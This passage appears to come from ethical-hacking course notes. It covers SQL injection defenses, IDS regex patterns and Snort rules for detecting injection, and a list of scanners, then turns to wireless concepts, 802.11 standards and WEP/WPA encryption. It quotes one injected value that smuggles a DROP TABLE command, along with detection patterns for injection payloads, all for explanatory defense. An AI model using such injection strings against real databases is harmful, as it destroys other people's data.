				- This would result in a dangerous SQL query execution:
					INSERT INTO UserDetails VALUES ('','',''); DROP TABLE UserDetails--', '');
				- Since MySQL uses a single quote (') to terminate strings, encoding the single quote is essential in dynamic SQL statements. The single quote can be encoded in two ways:
					- Replacing a single quote with two single quotes ('').
					- Escaping the single quote with a backslash (\').
				- Example of output encoding in Java: myQuery = myQuery.replace("’", "\’");
				- A major drawback of output encoding is that it must be applied consistently before every database query. Failure to do so could leave the application vulnerable to SQL injection attacks.
			- Enforcing Least Privileges:
				- The principle of least privilege (PoLP) is a security best practice that restricts access rights to the minimum necessary for each user or application. It is recommended to avoid granting database administrator (DBA) or administrative-level access to applications.
				- In critical cases where elevated access rights are required, security professionals should carefully assess the exact needs of the application. For instance, if an application only needs to read data, it should be assigned read-only privileges. Similarly, the operating system running the database should enforce minimal privileges and should never execute the database management system (DBMS) as the root user.
				- By limiting access rights, the risk of unauthorized access and SQL injection attacks can be significantly reduced.
			- LIKE Clauses:
				- When using the LIKE clause, special wildcard characters such as _, %, and [ should be properly escaped to prevent SQL injection attacks. This can be achieved using the Replace() method by enclosing these wildcards within square brackets.
				- Example:
					s = s.Replace("[", "[[]");
					s = s.Replace("%", "[%]");
					s = s.Replace("_", "[_]");
				- This ensures that wildcard characters are treated as literals rather than pattern-matching symbols.
			- Wrapping Parameters with QUOTENAME() and REPLACE():
				- To ensure that variables used in dynamic Transact-SQL statements are properly sanitized, they should be wrapped using QUOTENAME() and REPLACE().
				- If the string has ≤ 128 characters, use: QUOTENAME(@variable, '''')
				- If the string has > 128 characters, use: REPLACE(@variable, '''', '''''')
			- Example before and after applying the method:
				- Before: SET @temp = N'SELECT * FROM employees WHERE emp_lname =''' + @emp_lname + N'''';
				- After: SET @temp = N'SELECT * FROM employees WHERE emp_lname = ''' + REPLACE(@emp_lname,'''','''''') + N'''';
		- Detecting SQL Injection Attacks:
			- Security professionals must develop and deploy rules in an Intrusion Detection System (IDS) to detect SQL injection attacks on a web server. For this purpose, they should use regular expressions to identify SQL injection meta-characters such as the single quote (') and double dash (--). The following sections outline the regular expressions used to detect SQL injection-specific characters, along with their meanings.
			- Security professionals can use regex searches to detect SQL meta-characters.
			- Regular Expression for Detecting SQL Meta-Characters:
				- /(\')|(\%27)|(\-\-)|(#)|(\%23)/ix
				- Security professionals must check for regular expressions that identify SQL meta-characters in web requests, such as the single quote (') or its equivalent hex value (%27). Additionally, they should look for the double dash (--), as it is not an HTML character and is not encoded in web requests. Some SQL servers also require detection of the hash (#) character and its equivalent hex representation (%23).
				- These regular expressions should be used to analyze logs from security control devices such as Web Application Firewalls (WAF) and IDS solutions. Below is an example of an IDS log derived using Snort: alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg: "SQL Injection – Paranoid"; flow:to_server, established; uricontent:".pl"; pcre:"/(\')|(\%27)|(\-\-)|(#)|(\%23)/ix"; classtype:Web-application-attack; sid:9099; rev:5;)
				- Analysis of the Detected Log:
					- "alert": Indicates that an alert is generated when the IDS detects an attack signature in an HTTP request.
					- "tcp": Specifies the use of the TCP protocol.
					- "$EXTERNAL_NET": Represents the external network's IP address.
					- "any": Refers to any source port.
					- "->": Segregates the source from the destination.
					- "$HTTP_SERVERS": Denotes the number of web servers within an organization.
					- "$HTTP_PORTS": Represents common HTTP ports, such as 80 and 8080.
					- "msg:": Provides the message associated with the alert.
					- "flow:to_server": Indicates the traffic direction.
					- "established": Specifies that the alert is triggered only for established TCP connections.
					- "uricontent:'.pl'": Indicates that the alert applies to Perl script-based URI content.
			- Modified Regular Expression for Detecting SQL Meta-Characters:
				- /((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))/ix
				- Security professionals should use this regular expression to detect the equals sign (=) in user requests or its hex equivalent (%3D). The expression [^\n]* allows for any number of non-newline characters between the equals sign and the next SQL meta-character. The regex also checks for single quotes ('), double dashes (--), and semicolons (;).
			- Regular Expression for a Typical SQL Injection Attack:
				- /\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix
				- This expression detects zero or more alphanumeric characters or underscores followed by a single quote (') or its equivalent hex value (%27). The subsequent part of the expression identifies variations of the word "or" ("or", "Or", "oR", or "OR") in different cases, as well as their respective hex values.
			- Regular Expression for Detecting SQL Injection Using the UNION Keyword:
				- Some attackers use the UNION keyword in SQL injection queries to extend their attacks and gain further access. Security professionals should use the following regular expression to detect SQL queries containing the UNION keyword: /((\%27)|(\'))union/ix
				- This regex searches for a single quote (') or its hex equivalent (%27), followed by the UNION keyword in an HTTP request. Similar expressions should be created for detecting SQL keywords such as INSERT, UPDATE, SELECT, DELETE, and DROP.
			- Regular Expression for Detecting SQL Injection Attacks on Microsoft SQL Server:
				- If an attacker discovers that a web application is vulnerable to SQL injection and that the connected database is Microsoft SQL Server, they may attempt to execute advanced queries using stored procedures (sp) and extended procedures (xp).
				- Common extended procedures include:
					- xp_cmdshell (used to execute shell commands from SQL Server)
					- xp_regread (used to read Windows registry keys)
					- xp_regwrite (used to modify Windows registry keys)
				- To detect such malicious queries, security professionals should use the following regular expression: /exec(\s|\+)+(s|x)p\w+/ix
				- This regex checks for the exec keyword, followed by white spaces (or their hex equivalents), the letters sp or xp (representing stored or extended procedures), and finally, an alphanumeric or underscore character.
		- SQL Injection Detection Tools:
			- SQL injection detection tools help identify SQL injection attacks by monitoring HTTP traffic and SQL injection attack vectors. These tools determine whether a web application or database code is vulnerable to SQL injection.
			- OWASP ZAP (www.zaproxy.org):
				- OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool designed to detect vulnerabilities in web applications. It offers both automated scanners and a suite of tools that allow users to manually identify security flaws. Although it is ideal for developers and functional testers new to penetration testing, it is also useful for security professionals with extensive experience. ZAP helps identify and fix vulnerabilities, maximize remediation efforts, and reduce the risk of attacks.
			- Damn Small SQLi Scanner (DSSS) (github.com):
				- Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner that supports both GET and POST parameters. It scans web applications for various SQL injection vulnerabilities. Security professionals can use DSSS to detect and analyze SQL injection risks in web applications.
			- Snort (www.snort.org):
				- Many common cyberattacks utilize specific code sequences or commands that allow attackers to gain unauthorized access to systems and data. Snort, an open-source intrusion detection and prevention system (IDS/IPS), enables users to write rules to detect and mitigate SQL injection attacks.
				- Some of the regular expressions that can be blocked using Snort include:
					- /User-Agent\x3A\x20[^\r\n]*sleep\x28/i
					- /[?&]selInfoKey1=[^&]*?([\x27\x22\x3b\x23]|\x2f\x2a|\x2d\x2d)/i
					- /(^|&)selInfoKey1=[^&]*?([\x27\x22\x3b\x23]|\x2f\x2a|\x2d\x2d|%27|%22|%3b|%23|%2f%2a|%2d%2d)/im
					- /^\s*?MAIL\s+?FROM\x3a[^\r\n]*?\x28\x29\s\x7b/i
				- Example Snort rule for detecting SQL injection attempts using the sleep function in HTTP headers:
					- alert tcp any any -> any $HTTP_PORTS (msg:"SQL use of sleep function in HTTP header - likely SQL injection attempt";
					- flow:to_server, established; http_header; content:"User-Agent|3A| "; content:"sleep(", fast_pattern, nocase; 
					- pcre:"/User-Agent\x3A\x20[^\r\n]*sleep\x28/i"; 
					- metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community; 
					- service:http; reference:url,blog.cloudflare.com/the-sleepy-user-agent/; 
					- classtype:web-application-attack; sid:38993; rev:9;)
				- This Snort rule detects SQL injection attempts by monitoring HTTP headers for the presence of the sleep function, which is often used in time-based blind SQL injection attacks.
			- Ghauri (github.com)
			- Burp Suite (www.portswigger.net)
			- HCL AppScan (www. hcl-software.com)
			- Invicti (www.invicti.com)
			- SQL Invader (www.rapid7.com)
			- Arachni (ecsypno.com)
			- Qualys WAS (www.qualys.com)
			- Fortify WebInspect (www.microfocus.com)
			- BeSECURE (beyondsecurity.com)
			- SolarWinds® Security Event Manager (www.solarwinds.com)
			- sqlifinder (github.com)
			- dotDefender (http://www.applicure.com)
			- Wapiti (wapiti-scanner.github.io)
			- InsightAppSec (www.rapid7.com)
			- Acunetix Web Vulnerability Scanner (www.acunetix.com)
			- Detectify (detectify.com)


--------------------------------------------------

# Hacking Wireless Networks

- Wireless Concepts:
	- A wireless network is an unbounded data communication system that uses radio-frequency technology to communicate with devices and transmit data. This network eliminates the need for complex and multiple wired connections by using electromagnetic (EM) waves to interconnect two points without establishing a physical connection.
	- Wireless Terminology:
		- In a wireless network, data is transmitted through EM waves that carry signals over the communication path. Key terms associated with wireless networks include:
		- Global System for Mobile Communications (GSM): A universal system used for mobile data transmission in wireless networks worldwide.
		- Bandwidth: The amount of data that can be transmitted over a connection. Typically, bandwidth refers to the data transfer rate, measured in bits per second (bps).
		- Access Point (AP): A device that connects wireless devices to a wireless or wired network. It enables wireless communication devices to connect to a network through standards such as Bluetooth and Wi-Fi, functioning as a switch or hub between a wired LAN and a wireless network.
		- Basic Service Set Identifier (BSSID): The media access control (MAC) address of an access point (AP) or base station that has established a basic service set (BSS). Users are generally unaware of the BSS they are connected to. When a device moves, the BSS it uses may change due to variations in the AP’s coverage range, though this typically does not affect connectivity.
		- Industrial, Scientific, and Medical (ISM) Band: A set of radio frequencies designated for use by the international industrial, scientific, and medical communities.
		- Hotspot: A location where a wireless network is available for public use. Hotspots provide Wi-Fi access, allowing users to connect their devices to the Internet.
		- Association: The process of connecting a wireless device to an access point (AP).
		- Service Set Identifier (SSID): A unique 32-character alphanumeric identifier assigned to a wireless local area network (WLAN). The SSID distinguishes the network, allowing devices to connect to the desired WLAN. Devices must use the same SSID to establish a connection.
		- Orthogonal Frequency-Division Multiplexing (OFDM): A digital modulation method in which a signal at a chosen frequency is divided into multiple orthogonal carrier frequencies. OFDM maps information onto changes in carrier phase, frequency, and amplitude, or a combination of these. It enables high bit rates and allows bandwidth to be shared across independent channels.
		- Multiple Input, Multiple Output-Orthogonal Frequency-Division Multiplexing (MIMO-OFDM): A technique that enhances the spectral efficiency of 4G and 5G wireless communication services. MIMO-OFDM reduces interference and improves channel robustness.
		- Direct-Sequence Spread Spectrum (DSSS): A spread spectrum technique in which the original data signal is multiplied by a pseudo-random noise-spreading code. This modulation scheme protects signals from interference and jamming.
		- Frequency-Hopping Spread Spectrum (FHSS): Also known as frequency-hopping code-division multiple access (FH-CDMA), FHSS rapidly switches a carrier signal among multiple frequency channels. This method reduces the risk of unauthorized interception or jamming. A transmitter hops between available frequencies using a predefined algorithm in a pseudorandom sequence known to both the sender and receiver.
	- Wireless Networks;
		- Wireless networks use radio-wave transmission, typically operating at the physical layer of the network structure. With the global wireless communication revolution, data networking and telecommunications are undergoing fundamental changes.
		- Wi-Fi refers to a wireless local area network (WLAN) based on the IEEE 802.11 standard, allowing devices to access a network within the range of an access point (AP). Wi-Fi is a widely used technology in wireless communication, operating over radio channels. It employs various techniques such as direct-sequence spread spectrum (DSSS), frequency-hopping spread spectrum (FHSS), infrared (IR), and orthogonal frequency-division multiplexing (OFDM) to establish connections between transmitters and receivers. Devices such as personal computers, video game consoles, and smartphones use Wi-Fi to connect to network resources, including the Internet, via a wireless access point.
		- Advantages of Wireless Networks:
			- Fast and easy installation without the need for wiring through walls and ceilings
			- Provides connectivity in areas where laying cables is difficult
			- Allows network access from anywhere within the range of an access point
			- Public spaces such as airports, libraries, schools, and coffee shops offer constant Internet access through WLANs
		- Disadvantages of Wireless Networks:
			- Security may not always meet expectations
			- Bandwidth decreases as the number of connected devices increases
			- Wi-Fi upgrades may require new wireless cards and/or access points
			- Some electronic equipment can interfere with Wi-Fi networks
		- Types of Wireless Networks:
			- Extension to a Wired Network:
				- A wired network can be extended by placing access points (APs) between the wired infrastructure and wireless devices. An AP can also be used to create a wireless network.
				- There are two main types of APs:
					- Software APs (SAPs): These APs run on a computer equipped with a wireless network interface card (NIC) and can connect to a wired network.
					- Hardware APs (HAPs): These are dedicated devices that support most wireless networking features.
				- In this type of network, the AP functions as a switch, providing connectivity for computers with a wireless NIC. The AP enables wireless clients to connect to a wired local area network (LAN), granting access to LAN resources such as file servers and Internet connections.
			- Multiple Access Points:
				- This type of network connects computers wirelessly using multiple APs. If a single AP cannot cover an entire area, multiple APs or extension points can be deployed.
				- The wireless coverage of each AP must overlap with its neighboring AP to ensure seamless connectivity, a feature known as roaming. Some manufacturers offer extension points that act as wireless relays, extending the range of a single AP. Multiple extension points can be linked together to provide wireless access to locations far from the central AP.
			- LAN-to-LAN Wireless Network:
				- APs provide wireless connectivity to local computers, and multiple APs can interconnect different networks. While all hardware APs can communicate with other hardware APs, establishing LAN-to-LAN connections over wireless networks is a complex task.
			- 3G/4G/5G Hotspot:
				- A 3G/4G/5G hotspot is a type of wireless network that provides Wi-Fi access to Wi-Fi-enabled devices such as MP3 players, laptops, tablets, cameras, personal digital assistants (PDAs), netbooks, and more.
	- Wireless Standards:
		- The IEEE 802.11 standard has evolved from a basic wireless extension to wired local area networks (LANs) into a mature protocol supporting enterprise authentication, strong encryption, and quality of service (QoS). When first introduced in 1997, the standard specified operation at 1 and 2 Mbps in the infrared range and the license-exempt 2.4 GHz industrial, scientific, and medical (ISM) frequency band. Initially, an 802.11 network consisted of a few PCs with wireless capability connected to an Ethernet (IEEE 802.3) LAN through a single access point (AP). Today, 802.11 networks operate at much higher speeds across additional frequency bands. However, new challenges have emerged, such as security, roaming across multiple APs, and QoS management.
		- Amendments to the standard are designated by letters, derived from the 802.11 task groups that developed them, as outlined below.
		- 802.11 Wireless Standards:
			- 802.11 : The original 802.11 (Wi-Fi) standard applies to WLANs and uses frequency-hopping spread spectrum (FHSS) or direct-sequence spread spectrum (DSSS) for wireless communication. It enables electronic devices to establish a wireless connection.
			- 802.11a : The first amendment to the 802.11 standard, it operates in the 5 GHz frequency band and supports bandwidths up to 54 Mbps using orthogonal frequency-division multiplexing (OFDM). It offers high speeds but is more susceptible to signal degradation due to walls and obstacles.
			- 802.11b : Introduced in 1999, this standard operates in the 2.4 GHz ISM band and supports speeds up to 11 Mbps using DSSS modulation.
			- 802.11g : An extension of 802.11b, it supports a maximum bandwidth of 54 Mbps using OFDM technology while remaining backward-compatible with 802.11b devices.
			- 802.11n : Enhances 802.11g by incorporating multiple-input multiple-output (MIMO) antennas, operating in both the 2.4 GHz and 5 GHz bands, and supporting higher data rates.
			- 802.11ac : Operates in the 5 GHz band, offering Gigabit networking and increased speed and reliability compared to 802.11n.
			- 802.11ax (Wi-Fi 6) : The latest generation of Wi-Fi, building on 802.11ac (Wi-Fi 5). It supports speeds up to 9.6 Gbps, uses orthogonal frequency-division multiple access (OFDMA) for efficient multi-device communication, and improves performance in dense environments through features like BSS Coloring and Target Wake Time (TWT).
			- 802.11be (Wi-Fi 7) : An emerging standard designed to enhance Wi-Fi 6/6E, supporting speeds up to 30 Gbps with multilink operation (MLO) and reduced latency for real-time applications such as virtual reality (VR), augmented reality (AR), and IoT.
			- 802.11d : An enhanced version of 802.11a/b, it supports different regulatory domains and operates at the media access control (MAC) layer.
			- 802.11e : Defines QoS mechanisms for real-time applications such as voice over IP (VoIP) and video streaming by prioritizing network resources at Layer 2 (MAC layer).
			- 802.11i : Enhances WLAN security by implementing encryption protocols such as Temporal Key Integrity Protocol (TKIP) and Advanced Encryption Standard (AES).
			- 802.11ah (Wi-Fi HaLow) : Uses the 900 MHz band for extended-range Wi-Fi networks and is optimized for Internet of Things (IoT) applications, offering improved range and energy efficiency.
			- 802.11ad : Operates in the 60 GHz spectrum, providing ultra-fast data transmission rates but with limited range.
		- Other IEEE Wireless Standards:
			- 802.12 : Uses the demand priority protocol to optimize media utilization and supports 100 Mbps Ethernet speeds, offering compatibility with 802.3 and 802.5 networks.
			- 802.15 : Defines the standards for wireless personal area networks (WPANs) and connectivity for portable devices.
				- 802.15.1 (Bluetooth) : A short-range wireless communication standard operating in the 2.4 GHz band, commonly used for data exchange between fixed and mobile devices.
				- 802.15.4 (ZigBee) : A low-power, low-data-rate standard designed for mesh networking in IoT applications, transmitting data at 250 Kbps while optimizing battery life.
				- 802.15.5 : Supports both full-mesh and half-mesh topologies, handling network initialization, addressing, and unicasting.
			- 802.16 (WiMax) : A broadband wireless standard designed for metropolitan area networks (MANs) using a point-to-multipoint architecture. It supports multiple physical and MAC layer configurations for high-speed wireless communication.
	- Service Set Identifier (SSID):
		- A Service Set Identifier (SSID) is a case-sensitive, human-readable unique identifier for a wireless local area network (WLAN), consisting of up to 32 alphanumeric characters. The SSID serves as a token that helps identify and locate 802.11 (Wi-Fi) networks. By default, it is included in the frame header of packets transmitted over a WLAN, acting as a shared identifier between access points (APs) and clients. This allows users to discover an AP and attempt authentication (AUTH) and association (ASSOC).
		- Security Considerations:
			- Security concerns arise when users do not change default SSIDs, as attackers can easily exploit them. SSID broadcasting allows APs to respond to probe requests with probe responses containing the SSID unless it is hidden. Since all devices and APs within a WLAN must use the same SSID, any device attempting to join the network must provide the correct SSID.
			- If the network SSID is changed, the network administrator must update the SSID configuration on all client devices. Some non-secure access modes allow clients to connect using the configured SSID, a blank SSID, or an SSID set to "any", which can pose security risks. Because SSIDs are transmitted in plaintext within packets, they do not provide any inherent security for a WLAN.
			- For many commercial products, the default SSID is often the vendor’s name, making it easier for attackers to identify and exploit devices. The only way to keep an SSID truly confidential is to operate in a closed network with no activity, which is impractical for legitimate users.
	- Wi-Fi Authentication Process:
		- Wi-Fi authentication ensures secure access to a wireless network by verifying devices before granting them connectivity. Two primary authentication modes are commonly used:
		- Pre-Shared Key (PSK) Mode:
			- The Pre-Shared Key (PSK) mode, also known as WPA-PSK or WPA2-PSK, secures wireless networks using a single shared password for authentication. This method is widely used in homes and small offices due to its simplicity and ease of setup.
			- How It Works:
				- A shared password (pre-shared key) is manually entered into both the wireless router and the device attempting to connect.
				- Devices that provide the correct pre-shared key are authenticated and granted network access.
			- Advantages:
				- Easy to set up without requiring a dedicated authentication server.
				- Ideal for small networks where user management is simple.
			- Security Considerations:
				- The security of WPA/WPA2-Personal relies on the strength and secrecy of the pre-shared key.
				- Weak or commonly used passwords make networks vulnerable to attacks such as brute force or dictionary attacks.
		- Centralized Authentication Mode:
			- A more secure authentication method, WPA/WPA2-Enterprise mode (also called 802.1X mode), is used in large-scale networks where individual user credentials must be managed.
			- How It Works:
				- A centralized authentication server, typically a Remote Authentication Dial-In User Service (RADIUS) server, verifies user credentials.
				- The AP (Access Point) communicates with the RADIUS server to authenticate each user individually.
				- Instead of a shared password, users provide unique credentials, such as a username and password or a digital certificate.
			- Advantages:
				- Reduces the risk of unauthorized access, as compromised passwords do not grant access to the entire network.
				- Enhanced security—each user has unique login credentials.
				- Ideal for enterprises, educational institutions, and government agencies with many users and high security requirements.
			- Security Benefits:
				- Ensures each user is authenticated separately, preventing unauthorized access.
				- Supports advanced encryption and certificate-based authentication for additional security.
	- Types of Wireless Antennas:
		- Antennas are an integral part of Wi-Fi networks, responsible for transmitting and receiving radio signals by converting electrical impulses into radio waves and vice versa. Different types of wireless antennas serve specific purposes based on their coverage, range, and directionality.
		- Directional Antenna:
			- A directional antenna transmits and receives radio waves in a specific direction. Its design enhances signal strength in targeted directions while reducing interference from unwanted sources. These antennas are commonly used in point-to-point communication and long-range Wi-Fi links.
		- Omnidirectional Antenna:
			- An omnidirectional antenna radiates electromagnetic (EM) energy in all directions, providing a 360° horizontal radiation pattern. However, the signal is typically weaker in the vertical dimension.
			- Use Cases:
				- Ideal for networks where multiple wireless devices communicate over a broad area.
				- Commonly used in Wi-Fi routers, radio stations, and cellular networks, where receivers move frequently and need continuous connectivity.
		- Parabolic Grid Antenna:
			- A parabolic grid antenna functions like a satellite dish, but instead of a solid dish, it features a grid-like structure made of aluminum wires. It is designed for long-distance Wi-Fi transmissions using highly focused radio beams.
			- Key Features:
				- Capable of transmitting Wi-Fi signals over 10 miles with high accuracy.
				- Used for remote networking, rural internet access, and long-range point-to-point communication.
				- Can receive both horizontally and vertically polarized Wi-Fi signals.
			- Security Considerations: Due to its long-range capability, parabolic antennas can be exploited by attackers to intercept signals, conduct man-in-the-middle (MITM) attacks, or perform Layer-1 denial-of-service (DoS) attacks.
		- Yagi Antenna:
			- A Yagi antenna, also known as a Yagi–Uda antenna, is a unidirectional antenna commonly used in VHF and UHF frequency bands (ranging from 10 MHz to several GHz).
			- Key Features:
				- High gain and low signal-to-noise ratio (SNR).
				- Consists of a reflector, dipole, and multiple directors to focus radiation in a specific direction.
				- Generates an end-fire radiation pattern, making it ideal for TV reception, ham radio, and wireless communications.
		- Dipole Antenna:
			- A dipole antenna is a simple straight electrical conductor with a length of half a wavelength. It is bilaterally symmetrical, making it a balanced antenna.
			- Key Features:
				- Often used in radio broadcasting, Wi-Fi routers, and RF communication.
				- Works with a balanced parallel-wire RF transmission line.
				- Commonly referred to as a doublet antenna.
		- Reflector Antennas:
			- A reflector antenna is designed to concentrate electromagnetic (EM) energy at a focal point, improving signal strength and reducing interference. These antennas typically use parabolic reflectors.
			- Key Features:
				- Used in satellite communications, radar systems, and deep-space communication.
				- A larger reflector (in terms of wavelength multiples) results in higher gain.
				- Costlier to manufacture due to its precision design requirements.
- Wireless Encryption:
	- Wireless encryption is a method of securing wireless networks against attackers who attempt to intercept and exploit RF traffic to access sensitive information. Encryption ensures that data transmitted over a wireless network remains confidential and protected.
	- With the growing use of wireless networks, the risk of attacks has also increased. The most effective way to secure wireless communication is by encrypting data before transmission. Several wireless encryption algorithms have been developed, each with its own strengths and weaknesses.
	- Common Wireless Encryption Standards:
		- 802.11i:
			- An IEEE amendment that enhances security in 802.11 wireless networks.
			- Introduced stronger encryption and authentication mechanisms, leading to WPA2 adoption.
		- Wired Equivalent Privacy (WEP):
			- One of the earliest encryption algorithms for IEEE 802.11 networks.
			- Uses RC4 encryption with a 40-bit or 104-bit key.
			- Weakness: Easily cracked due to short initialization vectors (IVs) and weak key management.
		- Extensible Authentication Protocol (EAP):
			- Supports multiple authentication methods, such as token cards, Kerberos, and digital certificates.
			- Used in enterprise-grade Wi-Fi security solutions.
		- Lightweight EAP (LEAP):
			- A proprietary version of EAP developed by Cisco.
			- Initially used for enterprise Wi-Fi authentication, but now considered insecure due to vulnerabilities.
		- Wi-Fi Protected Access (WPA):
			- Improvement over WEP, introduced TKIP and Message Integrity Check (MIC).
			- Uses a 48-bit initialization vector (IV) and a 32-bit cyclic redundancy check (CRC).
		- Temporal Key Integrity Protocol (TKIP):
			- A security protocol used in WPA to replace WEP.
			- Offers better encryption and key management, but still less secure than AES.
		- Wi-Fi Protected Access 2 (WPA2):
			- Successor to WPA, using AES encryption with Counter Mode Cipher Block Chaining Message Authentication Code Protocol (CCMP).
			- Provides stronger security and is widely used in modern networks.
		- Advanced Encryption Standard (AES):
			- A symmetric-key encryption algorithm used in WPA2.
			- Considered highly secure and used by government and enterprise networks.
		- Counter Mode Cipher Block Chaining Message Authentication Code Protocol (CCMP):
			- An encryption protocol used in WPA2 for strong authentication and encryption.
			- Replaces TKIP for better security.
		- WPA2-Enterprise:
			- Combines EAP-based authentication with WPA2 encryption.
			- Uses RADIUS servers for centralized user authentication.
			- Ideal for corporate, educational, and government networks.
		- RADIUS (Remote Authentication Dial-In User Service):
			- A centralized authentication and authorization management system.
			- Often used in WPA2-Enterprise and WPA3-Enterprise networks.
		- Protected Extensible Authentication Protocol (PEAP):
			- Encapsulates EAP inside a TLS-encrypted tunnel.
			- Enhances security by preventing direct exposure of authentication credentials.
		- Wi-Fi Protected Access 3 (WPA3):
			- Latest Wi-Fi security standard with stronger encryption and improved authentication.
			- Uses Galois/Counter Mode-256 (GCMP-256) for encryption.
			- Implements 384-bit hash message authentication (HMAC-SHA-384) for better security.
			- Provides individualized encryption for open networks to prevent eavesdropping.
	- Wireless Encryption: Wired Equivalent Privacy (WEP):
		- Wired Equivalent Privacy (WEP) was an early encryption standard designed to protect wireless networks from unauthorized access and eavesdropping. However, as technology evolved, it became evident that WEP encryption is highly vulnerable to attacks.
		- What is WEP Encryption:
			- WEP is a security protocol defined by the IEEE 802.11 WLAN standard. Its primary goal was to provide data confidentiality in wireless networks, similar to the security measures available in wired LANs, which rely on physical security to prevent unauthorized access.
			- Unlike wired networks, where an attacker needs physical access to intercept data, wireless networks can be accessed remotely. To counter this, WEP encrypts data at the data link layer using the Rivest Cipher 4 (RC4), a symmetric encryption algorithm designed to protect against unauthorized access.
		- Role of WEP in Wireless Communication:
			- Prevents eavesdropping by encrypting wireless transmissions.
			- Attempts to restrict unauthorized access to the wireless network.
			- Uses a shared secret key between the mobile station and the access point (AP).
			- Encrypts packets before transmission and performs an integrity check to detect tampering.
			- Only encrypts data between network clients, leaving other traffic unprotected.
		- Advantages of WEP:
			- Confidentiality – Protects against link-layer eavesdropping.
			- Access Control – Regulates who can access the network.
			- Data Integrity – Prevents unauthorized modification of data.
			- Efficiency – Provides basic security without requiring additional hardware.
		- Key Points About WEP:
			- WEP was developed without peer review by cryptographers, leading to design flaws and security vulnerabilities.
			- WEP is a stream cipher that uses RC4 to generate a keystream, which is XORed with plaintext to encrypt data.
			- WEP key lengths:
				- 64-bit WEP => Uses a 40-bit key + 24-bit IV
				- 128-bit WEP => Uses a 104-bit key + 24-bit IV
				- 256-bit WEP => Uses a 232-bit key + 24-bit IV
		- How WEP Works:
			- CRC-32 checksum is used to compute a 32-bit Integrity Check Value (ICV), which is added to the data frame.
			- A 24-bit Initialization Vector (IV) is appended to the WEP key to form the WEP seed.
			- The WEP seed is used as input to the RC4 algorithm, generating a keystream.
			- The keystream is XORed with the data and ICV to create encrypted data.
			- The IV field (IV + PAD + KID) is added to the ciphertext to form a MAC frame.
		- Flaws of WEP:
			- Weak Encryption Key Distribution:
				- No key management system – Pre-shared keys (PSKs) are set once and rarely changed.
				- If an attacker intercepts multiple plaintext messages, they can recover the encryption key.
			- RC4 Vulnerabilities:
				- RC4 was not designed for WEP’s static key environment.
				- Since the same key is reused, attackers can analyze network traffic and extract the plaintext.
				- If both ciphertext and plaintext are known, an attacker can compute the encryption key.
			- Susceptibility to Passive Attacks:
				- Attackers can monitor traffic, capture data, and decrypt WEP keys using tools such as Fern Wi-Fi Cracker and WEP-key-break.
			- Key Scheduling Algorithm Weaknesses:
				- WEP's key scheduling is predictable, making it vulnerable to brute-force and cryptographic attacks.
		- Conclusion: WEP was a significant early attempt at wireless encryption but suffers from critical security flaws. Due to its weaknesses, WEP is no longer considered secure and has been replaced by WPA, WPA2, and WPA3, which offer stronger encryption and better authentication mechanisms.
	- Wireless Encryption: Wi-Fi Protected Access (WPA):
		- Wi-Fi Protected Access (WPA) is a security protocol defined by the IEEE 802.11i standard. Before WPA, the primary security mechanism for wireless networks was Wired Equivalent Privacy (WEP), which had a major vulnerability—it used a static encryption key that attackers could easily exploit using freely available tools.
		- To address this issue, IEEE defines WPA as “an expansion to the 802.11 protocols that allows for increased security.” Today, nearly every Wi-Fi manufacturer supports WPA.
		- WPA enhances data encryption security by implementing a Message Integrity Check (MIC) and using the Temporal Key Integrity Protocol (TKIP). TKIP employs the RC4 stream cipher with 128-bit encryption keys and a 64-bit MIC, providing stronger encryption and authentication than WEP.
		- WPA is an example of how 802.11i improves encryption while enabling both pre-shared key (PSK) and Extensible Authentication Protocol (EAP) authentication. WPA’s TKIP-based encryption eliminates WEP’s weaknesses by incorporating:
			- Per-packet key mixing functions
			- Message Integrity Checks (MICs)
			- Extended initialization vectors (IVs)
			- Key rekeying mechanisms
		- Unlike WEP, which uses 40-bit or 104-bit encryption keys, WPA’s TKIP generates a new 128-bit key for each packet, making it significantly more secure. The MIC in WPA prevents attackers from altering or replaying data packets.
		- Key Components of WPA:
			- Temporal Key Integrity Protocol (TKIP):
				- TKIP enhances security by:
				- Changing the encryption key for each packet, ensuring automatic synchronization between the wireless client and access point (AP).
				- Using the Michael Integrity Check (MIC) algorithm to generate a MIC value for verifying message integrity.
				- Employing RC4 stream cipher encryption with 128-bit keys and a 64-bit MIC.
				- Increasing the size of the IV and implementing mixing functions to prevent attacks.
				- Utilizing a 128-bit temporal key (TK), which is combined with the client’s MAC address and an IV to generate a keystream for RC4 encryption.
				- Implementing a sequence counter to protect against replay attacks.
				- Adding a rekeying mechanism, where TKs are refreshed every 10,000 packets, making TKIP-resistant to key reuse attacks.
			- Temporal Keys (TKs):
				- All modern Wi-Fi devices support either TKIP (WPA) or AES (WPA2) for wireless encryption.
				- In WEP, encryption keys (TKs) are derived from the Pairwise Master Key (PMK) during EAP authentication.
				- In WPA and WPA2, encryption keys are established through a four-way handshake:
				- WPA Four-Way Handshake Process:
					- The AP sends an ANonce (Authenticator Nonce) to the client, which is used to generate a Pairwise Transient Key (PTK).
					- The client responds with an SNonce (Supplicant Nonce), along with a MIC for message integrity.
					- The AP sends the Group Temporal Key (GTK) and a sequence number, along with another MIC, for use in the next broadcast frames.
					- The client confirms the installation of the temporal keys, completing the handshake.
		- How WPA Works:
			- A TK (Temporal Key), transmit address, and TKIP Sequence Counter (TSC) are used as inputs to the RC4 encryption algorithm to generate a keystream.
				- The IV (Initialization Vector), TK sequence, MAC destination address, and TK are combined with a hash/mixing function to create a 128-bit or 104-bit key.
				- This key is combined with RC4 to produce a keystream matching the original message length.
			- The MAC Service Data Unit (MSDU) and Message Integrity Check (MIC) are combined using the Michael algorithm.
			- The MSDU + MIC combination is fragmented to generate the MAC Protocol Data Unit (MPDU).
			- A 32-bit Integrity Check Value (ICV) is computed for the MPDU.
			- The MPDU + ICV is bitwise XORed with the keystream, producing encrypted data.
			- The IV is added to the encrypted data to form the final MAC frame for transmission.
		- Conclusion: WPA was a significant security improvement over WEP, providing better encryption and authentication mechanisms. However, WPA still relies on RC4, which has vulnerabilities. This led to the development of WPA2, which replaced TKIP with AES-based encryption for even stronger security.
	- Wireless Encryption: WPA2:
